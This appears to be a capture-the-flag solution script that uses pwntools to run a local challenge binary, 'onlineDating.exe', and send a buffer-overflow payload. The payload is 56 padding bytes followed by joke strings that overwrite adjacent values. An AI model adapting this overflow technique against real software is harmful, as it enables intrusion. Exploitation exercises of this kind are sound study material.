from pwn import *

p=process('./onlineDating.exe')
elf=ELF('./onlineDating.exe')
payload=b'A'*56+b'Gerard_Pique'+b'Clara_C.'+b'TwingoOo'+b'CasioOo!'
p.sendline(payload)
msg=p.recvall()
print(msg)